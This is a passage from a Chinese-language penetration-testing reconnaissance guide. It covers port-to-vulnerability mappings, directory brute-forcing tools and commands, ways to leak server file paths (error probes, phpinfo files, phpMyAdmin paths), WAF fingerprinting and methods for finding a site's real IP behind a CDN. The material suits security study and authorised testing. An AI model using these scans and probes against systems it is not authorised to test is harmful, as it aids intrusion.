tftp文件传输协议</span><br><span class="line">2049--&gt; Nfs服务</span><br><span class="line">389--&gt; Ldap目录访问协议</span><br></pre></td></tr></table></figure><h4 id="远程连接服务端口"><a class="markdownIt-Anchor" href="#远程连接服务端口">#</a> 远程连接服务端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">22--&gt; SSH远程连接</span><br><span class="line">3389--&gt; rdp远程连接</span><br><span class="line">5900--&gt; VNC</span><br><span class="line">5632--&gt; Pyanywhere服务</span><br></pre></td></tr></table></figure><h4 id="邮件服务端口"><a class="markdownIt-Anchor" href="#邮件服务端口">#</a> 邮件服务端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">25--&gt; SMTP服务</span><br><span class="line">110--&gt; POP3协议</span><br><span class="line">143--&gt; IMAP协议</span><br></pre></td></tr></table></figure><h4 id="网络常见协议端口"><a class="markdownIt-Anchor" href="#网络常见协议端口">#</a> 网络常见协议端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">53--&gt; DNS域名系统</span><br><span class="line">67/68--&gt; DHCP服务</span><br><span class="line">161--&gt; SNMP协议</span><br></pre></td></tr></table></figure><h4 id="特殊服务端口"><a class="markdownIt-Anchor" href="#特殊服务端口">#</a> 特殊服务端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2181--&gt; Zookeeper服务--分布式应用程序协同服务</span><br><span class="line">8069--&gt; Zabbix服务--基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案</span><br><span class="line">9200/9300--&gt; Elasticsearch服务--分布式多用户能力的全文搜索引擎</span><br><span class="line">11211--&gt; Memcache服务--分布式的高速缓存系统</span><br><span class="line">873--&gt; Rsync服务--linux系统下的数据镜像备份工具</span><br><span class="line">3690--&gt; Svn服务--开放源代码的版本控制系统</span><br></pre></td></tr></table></figure><h4 id="特殊服务端口未授权命令执行漏洞"><a class="markdownIt-Anchor" href="#特殊服务端口未授权命令执行漏洞">#</a> 特殊服务端口（未授权 / 命令执行 / 漏洞）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">443 SSL心脏滴血 </span><br><span class="line">873 Rsync未授权 </span><br><span class="line">5984 CouchDB http://xxx:5984/_utils/ </span><br><span class="line">6379 redis未授权 </span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列 </span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span><br><span class="line">11211 memcache未授权访问 </span><br><span class="line">27017,27018 Mongodb未授权访问 </span><br><span class="line">50000 SAP命令执行 </span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br></pre></td></tr></table></figure><h4 id="常见端口和攻击方法"><a class="markdownIt-Anchor" href="#常见端口和攻击方法">#</a> 常见端口和攻击方法</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628060318469-3ac3f808-c3ee-4031-b844-5e3bfbcdd46a.png" alt="img"></p><h3 id="端口扫描-2"><a class="markdownIt-Anchor" href="#端口扫描-2">#</a> 端口扫描</h3><p>当确定了目标大概的 ip 段后，可以先对 ip 的开放端口进行探测，一些特定服务可能开起在默认端口上，探测开放端口有利于快速收集目标资产，找到目标网站的其他功能站点；</p><h4 id="msscan端口扫描"><a class="markdownIt-Anchor" href="#msscan端口扫描">#</a> msscan 端口扫描</h4><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JvYmVydGRhdmlkZ3JhaGFtL21hc3NjYW4=">https://github.com/robertdavidgraham/masscan</span></p><p>使用介绍：<span class="exturl" data-url="aHR0cDovL3d3dy5zZWF1bmcuY2MvMjAyMC8wMi8wNS9tYXNzY2FuLWJhc2Uv">http://www.seaung.cc/2020/02/05/masscan-base/</span></p><h4 id="御剑端口扫描工具"><a class="markdownIt-Anchor" href="#御剑端口扫描工具">#</a> 御剑端口扫描工具</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628059967166-26f2e5e3-a406-4d73-83dc-463bcbc1fc85.png" alt="img"></p><h4 id="map扫描端口和探测端口信息"><a class="markdownIt-Anchor" href="#map扫描端口和探测端口信息">#</a> map 扫描端口和探测端口信息</h4><p>详细使用方法：<span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2RvY3Mvc2hhcmUvY2MzZWIxODUtMjBiYy00YThlLTk2OTUtYTU4YzY1YjNiOGQ1PyMlRUYlQkMlODglRTUlQUYlODYlRTclQTAlODElRUYlQkMlOUFpeTg0JUVGJUJDJTg5">https://www.yuque.com/docs/share/cc3eb185-20bc-4a8e-9695-a58c65b3b8d5?#（密码：iy84）</span> 《Nmap 常用命令》</p><h4 id="在线端口检测"><a class="markdownIt-Anchor" href="#在线端口检测">#</a> 在线端口检测</h4><p>地址：<span class="exturl" data-url="aHR0cDovL2Nvb2xhZi5jb20vdG9vbC9wb3J0">http://coolaf.com/tool/port</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628060066761-2a0a9b74-05ed-461a-8039-7cdb1826af4a.png" alt="img"></p><h2 id="目录类站点"><a class="markdownIt-Anchor" href="#目录类站点">#</a> 目录类站点</h2><h3 id="目录扫描"><a class="markdownIt-Anchor" href="#目录扫描">#</a> 目录扫描</h3><p>目的：</p><ul><li><ul><li>寻找网站的后台</li><li>寻找未授权页面</li></ul></li><li><ul><li>寻找网站更多隐藏信息</li></ul></li></ul><h4 id="常见敏感文件或目录"><a class="markdownIt-Anchor" href="#常见敏感文件或目录">#</a> 常见敏感文件或目录</h4><p>通常我们所说的敏感文件、敏感目录大概有以下几种：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">后台</span><br><span class="line">robots.txt</span><br><span class="line">数据库log</span><br><span class="line">sitemap.xml</span><br><span class="line">mysql.sql</span><br><span class="line">licence.txt</span><br><span class="line">Git</span><br><span class="line">hg/Mercurial</span><br><span class="line">svn/Subversion</span><br><span class="line">bzr/Bazaar</span><br><span class="line">Cvs</span><br><span class="line">WEB-INF泄露</span><br><span class="line">备份文件泄露、配置文件泄露</span><br></pre></td></tr></table></figure><h4 id="常用后台"><a class="markdownIt-Anchor" href="#常用后台">#</a> 常用后台</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">admin/ </span><br><span class="line">admin.后缀</span><br><span class="line">admin/login.后缀 </span><br><span class="line">manage </span><br><span class="line">webmanager</span><br><span class="line">等等</span><br></pre></td></tr></table></figure><h4 id="文件路径tips"><a class="markdownIt-Anchor" href="#文件路径tips">#</a> 文件路径 tips</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看网站图片，其中目录很可能包含管理目录，这里查看要躲在几个地方查看;</span><br><span class="line">1.首页</span><br><span class="line">2.新闻中心</span><br><span class="line">3.上传点</span><br><span class="line">就是查看的图片要有不同上传点上传的图片，如果图片保存路径在后台的下级目录，那么这种方法屡试不爽。</span><br></pre></td></tr></table></figure><h4 id="rototstxt"><a class="markdownIt-Anchor" href="#rototstxt">#</a> rotots.txt</h4><p>作用：</p><ul><li><ul><li>Robots 协议 “网络爬虫排除标准”，网站通过 Robots 协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取；</li><li>同时也记录网站所具有的基本的目录；</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627465079912-c6d85864-f971-425e-8c8b-7f3ceea5b22b.png" alt="img"></p><h4 id="搜索引擎"><a class="markdownIt-Anchor" href="#搜索引擎">#</a> 搜索引擎</h4><p>搜索引擎会爬取网站下目录，并且不需要触碰网站任何防御设备；</p><p>语法：site:360.cn</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627465248183-fb04fe1a-927b-4bc1-9020-0326dd0e1f0a.png" alt="img"></p><h4 id="爆破枚举"><a class="markdownIt-Anchor" href="#爆破枚举">#</a> 爆破枚举</h4><p>原理：通过字典匹配网站是否返回响应正确状态码，然后列出存在的目录；</p><p>爆破可能会触发网站防火墙规则拦截，造成封禁 IP 现象；</p><p><strong>字典</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali默认字典：</span><br><span class="line">cd /usr/share/wordlists/</span><br><span class="line">  </span><br><span class="line">https://gitee.com/molok/Blasting_dictionary</span><br><span class="line">https://github.com/TheKingOfDuck/fuzzDicts</span><br><span class="line">https://github.com/fuzz-security/SuperWordlist</span><br></pre></td></tr></table></figure><p><strong>dirb</strong></p><p>kali 自带简易目录扫描工具</p><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">参数：</span><br><span class="line">-a   //设置UA</span><br><span class="line">  -z   //设置毫秒延迟</span><br><span class="line">  -b   //不扫描../或者./</span><br><span class="line">  -c   //设置cookie</span><br><span class="line">  -E   //设置证书文件</span><br><span class="line">  -N   //忽略某些响应码</span><br><span class="line">  -X   //在每个测试目录上附加后缀</span><br><span class="line">  -o 文件名  //保存扫描文件</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">使用：</span><br><span class="line">dirb http://www.baidu.com </span><br><span class="line">  dirb http://www.baidu.com /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure><p><strong>DirBuster</strong></p><p>Kali Linux 提供的目录扫描工具 DirBuster 支持全部的 Web 目录扫描方式。它既支持网页爬虫方式扫描，也支持基于字典暴力扫描，还支持纯暴力扫描。该工具使用 Java 语言编写，提供命令行（Headless）和图形界面（GUI）两种模式。其中，图形界面模式功能更为强大。用户不仅可以指定纯暴力扫描的字符规则，还可以设置以 URL 模糊方式构建网页路径。同时，用户还对网页解析方式进行各种定制，提高网址解析效率；</p><p>启动：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">终端输入：dirbuster</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627470634103-8ea88074-133c-4de4-94bd-c36afe9682cc.png" alt="img"><br><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627470885474-91ef21c0-c6a6-4c0b-a79e-b280b210fc8b.png" alt="img"></p><p>如果你扫描的目标是 http://www.xxx.com/admin/，那么就要在 URL fuzz 里填写 &quot;/admin/{dir}&quot;, 意思是在 &quot;{dir}“的前后可以随意拼接你想要的目录或者后缀，例如输入”: /admin/{dir}.php&quot; 就表示扫描 admin 目录下的所有 php 文件</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627471028261-c72762d1-ec97-4424-810d-e65717179b2f.png" alt="img"></p><p><strong>Dirmap</strong></p><p>一个高级 web 目录扫描工具，功能将会强于 DirBuster、Dirsearch、cansina、御剑；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0g0Y2tGb3JKb2IvZGlybWFw">https://github.com/H4ckForJob/dirmap</span></p><p>安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/H4ckForJob/dirmap.git</span><br><span class="line"></span><br><span class="line">python3 -m pip install -r requirement.txt</span><br><span class="line"></span><br><span class="line">//关于bruter.py第517行bar.log.start()出错。解决方案：安装progressbar2。卸载progressbar。防止导入同名模块。</span><br><span class="line"></span><br><span class="line">python3 -m pip uninstall progressbar</span><br><span class="line">python3 -m pip install progressbar2</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">python3 dirmap.py -i https://target.com -lcf</span><br><span class="line"></span><br><span class="line">python3 dirmap.py -i 192.168.1.1 -lcf</span><br><span class="line"></span><br><span class="line">python3 dirmap.py -i 192.168.1.0/24 -lcf</span><br><span class="line"></span><br><span class="line">python3 dirmap.py -i 192.168.1.1-192.168.1.100 -lcf</span><br><span class="line"></span><br><span class="line">python3 dirmap.py -iF targets.txt -lcf</span><br><span class="line"></span><br><span class="line">//结果将自动保存在项目根目录下的output文件夹中</span><br><span class="line">//每一个目标生成一个txt，命名格式为目标域名.txt</span><br><span class="line">//结果自动去重复，不用担心产生大量冗余</span><br></pre></td></tr></table></figure><p><strong>御剑</strong></p><p>国内第一目录扫描器，小白利器；</p><p>地址 **：**<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Zvcnl1amlhbi95amRpcnNjYW4=">https://github.com/foryujian/yjdirscan</span></p><p><strong>7kbstorm</strong></p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzdrYnN0b3JtLzdrYnNjYW4tV2ViUGF0aEJydXRl">https://github.com/7kbstorm/7kbscan-WebPathBrute</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628060773788-d3395770-467d-4807-80e9-abe49b1a0afb.png" alt="img"></p><h3 id="物理路径"><a class="markdownIt-Anchor" href="#物理路径">#</a> 物理路径</h3><h4 id="报错"><a class="markdownIt-Anchor" href="#报错">#</a> 报错</h4><p>在处理报错信息的问题上如果处理不当，就可导致路径信息泄露，比如访问一些不存在的文件等思路；</p><p>报错方法很多，说不完的，具体还要根据实际情况操作；</p><p>比较实用的：</p><ul><li><ul><li>有动态 URL 的地方可以替换参数 替换参数值为不存在的，很多时候都能爆物理路径；</li><li>访问不存在的文件名 文件 或者改正常后缀为不支持的后缀；</li></ul></li><li><ul><li><ul><li>IIS7.0 以上，如果没有修改 404 页面，只要浏览 web 任意不存在的文件，都会直接暴出绝对路径；</li><li>同理，thinkphp 也有这个性质。 在 id=1 的注入点，使用各种不支持的字符，比如 id=1’ id=? id=-1 id=\ id=/ 都有可能暴出绝对路径；</li></ul></li></ul></li><li><ul><li><ul><li>还有的时候传一些错误图片会报错 windows 不支持的符号，?:&lt;&gt; 之类的，还有 windows 不支持的文件名 aux Windows 服务器上传 aux 文件或者新建 aux 文件夹，因为不允许这种文件存在而报错泄露绝对路径；</li></ul></li></ul></li><li><ul><li>尤其是 php 框架写的站，上传很容易爆出物理路径，根据具体情况了，比如提交允许的后缀，整体提交时抓包改为不支持的后缀，放包，很多时候都能爆出物理路径。 有一部分都是 sql 语句报错，sql 很多时候会爆物理路径；</li></ul></li></ul><h4 id="后台"><a class="markdownIt-Anchor" href="#后台">#</a> 后台</h4><p>可以登录后台的话，后台首页一般都有服务器信息的，大部分情况下物理路径都在里面；</p><h4 id="功能点"><a class="markdownIt-Anchor" href="#功能点">#</a> 功能点</h4><p>上传图片处 ：</p><p>第一点：在上传图片处，这里是最可能存在问题的点，就是关于上传相关证明，进行实名制上传信息等功能页面，在上传图片时进行抓包，然后查看返回包，那么就可看到当前服务器的绝对路径信息；</p><h4 id="容器特性"><a class="markdownIt-Anchor" href="#容器特性">#</a> 容器特性</h4><p>如：Apache Tomcat、Struts2、CMS、zabix、Nginx 等等，例如 Nginx 的某版本解析漏洞，就可造成路径信息泄露；</p><p>常见点：</p><ul><li><ul><li>IIS 大于 6 的版本，基本都是 导致他 404 就可以爆出物理路径、IIS 名、IIS 版本。这个很简单，随便访问个不存在的目录或文件就可以；</li><li>nginx 文件类型错误解析爆路径:</li></ul></li><li><ul><li><ul><li>说明：要求 Web 服务器是 nginx，且存在文件类型解析漏洞；</li><li>有时在图片地址后加 /x.php，该图片不但会被当作 php 文件执行，有可能爆出物理路径 <span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29tL3h4LmpwZy94LnBocCVFRiVCQyU5Qg==">www.xxx.com/xx.jpg/x.php；</span></li></ul></li></ul></li></ul><h4 id="文件泄露"><a class="markdownIt-Anchor" href="#文件泄露">#</a> 文件泄露</h4><p><strong>遗留文件 探针文件：</strong></p><p>通过遗留文件获得，比如：</p><ul><li><ul><li><ul><li>phpinfo.php</li><li>info.php</li></ul></li></ul></li><li><ul><li><ul><li>site.php</li><li>1.php</li></ul></li></ul></li><li><ul><li><ul><li>a.php</li></ul></li></ul></li></ul><p>一些探针文件啊都有，等等；</p><p>在遗留文件中搜索 SCRIPT_FILENAME；很多网站的根目录下都存在测试文件，脚本代码通常都是 phpinfo ()；</p><p>如：</p><ul><li><ul><li>test.php</li><li>ceshi.php</li></ul></li><li><ul><li>info.php</li><li>phpinfo.php</li></ul></li><li><ul><li>php_info.php</li><li>1.php</li></ul></li></ul><p><strong>phpmyadmin 爆路径：</strong></p><p>一旦找到 phpmyadmin 的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径；</p><p>至于 phpmyadmin 的地址可以用 wwwscan 这类的工具去扫，也可以选择 google；</p><p>常见路径：</p><ul><li><ul><li>/phpmyadmin/libraries/lect_lang.lib.php</li><li>/phpMyAdmin/index.php?lang[]=1</li></ul></li><li><ul><li>/phpMyAdmin/phpinfo.php load_file()</li><li>/phpmyadmin/themes/darkblue_orange/layout.inc.php</li></ul></li><li><ul><li>/phpmyadmin/libraries/select_lang.lib.php</li><li>/phpmyadmin/libraries/lect_lang.lib.php</li></ul></li><li><ul><li>/phpmyadmin/libraries/mcrypt.lib.php</li></ul></li></ul><p><strong>配置文件找路径：</strong></p><p>如果注入点有文件读取权限，就可以手工 load_file 或工具读取配置文件，再从中寻找路径信息（一般在文件末尾），各平台下 Web 服务器和 PHP 的配置文件默认路径可以上网查；</p><p>常见配置文件：</p><ul><li><ul><li>c:\windows\php.ini php 配置文件</li><li>c:\windows\system32\inetsrv\MetaBase.xml    IIS 虚拟主机配置文件</li></ul></li><li><ul><li>C:\xampp\apache\conf\httpd.conf</li><li>/var/www/conf/httpd.conf</li></ul></li></ul><p>常见集成环境默认目录，后面往往还有以域名命名的目录：</p><ul><li><ul><li>C:\Inetpub\wwwroot</li><li>C:\xampp\htdocs</li></ul></li><li><ul><li>D: \phpStudy\WWW</li><li>/home/wwwroot/ /www/users/</li></ul></li></ul><h4 id="默认路径"><a class="markdownIt-Anchor" href="#默认路径">#</a> 默认路径</h4><p><strong>Linux:</strong></p><p>linux 还可以用瞎蒙大法；</p><ul><li><ul><li>/var/www/html/ 网站名</li><li>/etc/php.ini php 配置文件</li></ul></li><li><ul><li>/etc/httpd/conf.d/php.conf</li><li>/etc/httpd/conf/httpd.conf Apache 配置文件</li></ul></li><li><ul><li>/usr/local/apache/conf/httpd.conf</li><li>/usr/local/apache2/conf/httpd.conf</li></ul></li><li><ul><li>/usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件</li></ul></li></ul><h2 id="waf"><a class="markdownIt-Anchor" href="#waf">#</a> WAF</h2><p>WAF (web 应用防火墙)：是款专门针对 Web 应用攻击的防护产品；</p><h3 id="识别"><a class="markdownIt-Anchor" href="#识别">#</a> 识别：</h3><h4 id="简单sql语法看是否拦截"><a class="markdownIt-Anchor" href="#简单sql语法看是否拦截">#</a> 简单 sql 语法看是否拦截</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627472590901-8b8dac7c-e193-46ba-95d5-d5830521ad57.png" alt="img"></p><h4 id="nmap脚本识别waf"><a class="markdownIt-Anchor" href="#nmap脚本识别waf">#</a> nmap 脚本识别 waf</h4><p>经测试，不靠谱；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80,443 --script=http-waf-detect 目标主机</span><br><span class="line">nmap -p 80,443 --script=http-waf-fingerprint 目标主机（精度更高）</span><br></pre></td></tr></table></figure><h4 id="wafw00f"><a class="markdownIt-Anchor" href="#wafw00f">#</a> wafw00f</h4><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuYWJsZXNlY3VyaXR5L3dhZncwMGY=">https://github.com/enablesecurity/wafw00f</span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Linux:</span><br><span class="line">wafw00f www.baidu.com</span><br><span class="line"></span><br><span class="line">windows:</span><br><span class="line">python3 setup.py install</span><br><span class="line">  cd wafw00f</span><br><span class="line">  python3 main.py www.baidu.com</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627475131807-eab5a37b-6c75-4306-beb0-cf2d36a36882.png" alt="img"></p><h4 id="identywaf"><a class="markdownIt-Anchor" href="#identywaf">#</a> identYwaf</h4><p><strong>identYwaf</strong> 是一种识别工具，可以基于盲推理识别 Web 保护类型（即 WAF）;</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N0YW1wYXJtL2lkZW50eXdhZg==">https://github.com/stamparm/identywaf</span></p><p>语法：python3 <span class="exturl" data-url="aHR0cDovL2lkZW50WXdhZi5weQ==">identYwaf.py</span> ip/url</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627477001156-f671fd10-24f7-404a-a9fa-0fac40e20231.png" alt="img"></p><h4 id="看图识别"><a class="markdownIt-Anchor" href="#看图识别">#</a> 看图识别</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/3uUZKryCufQ_HcuMc8ZgQQ</span><br></pre></td></tr></table></figure><h2 id="cdn"><a class="markdownIt-Anchor" href="#cdn">#</a> CDN</h2><h3 id="介绍-2"><a class="markdownIt-Anchor" href="#介绍-2">#</a> 介绍</h3><p>CDN 的全称是 Content Delivery Network，即<span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9wcm9kdWN0L2Nkbj9mcm9tPTEwNjgw">内容分发网络</span>，基本思路就是通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN 核心的就是使用户可就近访问网络，取得所需内容，解决网络拥挤的状况，提高用户访问网站的响应速度或者用户下载速度。一般来说，网站开启 CDN 之后，会根据用户所在地的不同访问 CDN 的节点服务器，并不直接访问源服务器，这样可以减少网站服务器宽带资源，降低服务器压力，可以提升用户体验。这也就是大家都在 ping 百度，但是不同地区得到的反馈 ip 不一样的原因。其次，由于 CDN 节点的阻挡防护，可以更好的保护员服务器的安全。具体来说，CDN 其实是充当了一个替身的角色，无论服务器是渗透还是 DD0S 攻击，攻击的目标都将是 CDN 节点，这样一来便间接的保护了网站本身；</p><p>常见的有：Cloudflare、yunjiasu</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628066485551-dc8296fe-ee3b-494a-8ed2-3bdda175383f.png" alt="img"></p><h3 id="验证是否存在cdn"><a class="markdownIt-Anchor" href="#验证是否存在cdn">#</a> 验证是否存在 CDN</h3><h4 id="ping"><a class="markdownIt-Anchor" href="#ping">#</a> ping</h4><p>使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一，多半是使用了 CDN；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">国内在线：</span><br><span class="line">CDN云观测：http://cdn.chinaz.com/</span><br><span class="line">    超级ping：http://ping.chinaz.com/</span><br><span class="line">爱站：https://ping.aizhan.com/</span><br><span class="line">    17ce：https://www.17ce.com/</span><br><span class="line"></span><br><span class="line">国外在线：</span><br><span class="line">cdnplanet：https://www.cdnplanet.com/tools/cdnfinder/</span><br><span class="line">    站长工具：http://tool.chinaz.com/speedworld/</span><br><span class="line">    ping：http://www.ping.pe/</span><br><span class="line"></span><br><span class="line">全球：</span><br><span class="line">ipip：https://tools.ipip.net/httphead.php</span><br><span class="line">    wepcc：https://www.wepcc.com/</span><br></pre></td></tr></table></figure><h4 id="nslookup"><a class="markdownIt-Anchor" href="#nslookup">#</a> nslookup</h4><p>使用 nslookup 进行检测，原理同 ping，如果返回域名解析对应多个 IP 地址多半是使用了 CDN；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup www.baidu.com</span><br></pre></td></tr></table></figure><h3 id="绕过"><a class="markdownIt-Anchor" href="#绕过">#</a> 绕过</h3><h4 id="查询历史dns记录"><a class="markdownIt-Anchor" href="#查询历史dns记录">#</a> 查询历史 DNS 记录</h4><p>查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://dnsdb.io/zh-cn/                                        ###DNS查询</span><br><span class="line">https://x.threatbook.cn/                                       ###微步在线</span><br><span class="line">http://toolbar.netcraft.com/site_report?url=         ###在线域名信息查询</span><br><span class="line">http://viewdns.info/                                              ###DNS、IP等查询</span><br><span class="line">https://tools.ipip.net/cdn.php                               ###CDN查询IP</span><br></pre></td></tr></table></figure><h4 id="securitytrails平台"><a class="markdownIt-Anchor" href="#securitytrails平台">#</a> SecurityTrails 平台</h4><p>只需在搜索字段中输入网站域名，然后按 Enter 键即可，这时 “历史数据” 就可以在左侧的菜单中找到。SecurityTrails 平台除了过去的 DNS 记录，即使是当前的记录也可能泄漏原始服务器 IP。例如，MX 记录是一种常见的查找 IP 的方式。如果网站在与 web 相同的服务器和 IP 上托管自己的邮件服务器，那么原始服务器 IP 将在 MX 记录中；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9zZWN1cml0eXRyYWlscy5jb20v">https://securitytrails.com/</span></p><h4 id="在线网站获取"><a class="markdownIt-Anchor" href="#在线网站获取">#</a> 在线网站获取</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://get-site-ip.com/</span><br></pre></td></tr></table></figure><h4 id="查询子域名"><a class="markdownIt-Anchor" href="#查询子域名">#</a> 查询子域名</h4><p>毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个 C 段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实 IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https://x.threatbook.cn/ </span><br><span class="line"></span><br><span class="line">https://dnsdb.io/zh-cn/</span><br><span class="line"></span><br><span class="line">https://securitytrails.com/list/keyword</span><br><span class="line"></span><br><span class="line">https://tool.chinaz.com/subdomain/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Google 搜索；例如：用语法&quot;site:baidu.com -www&quot;就能查看除www外的子域名。</span><br><span class="line"></span><br><span class="line">子域名扫描器,前面有介绍。</span><br></pre></td></tr></table></figure><p>找到子域名继续确认子域名没有 cdn 的情况下批量进行域名解析查询，有 cdn 的情况继续查询历史；</p><p>域名批量解析：</p><ul><li><ul><li><span class="exturl" 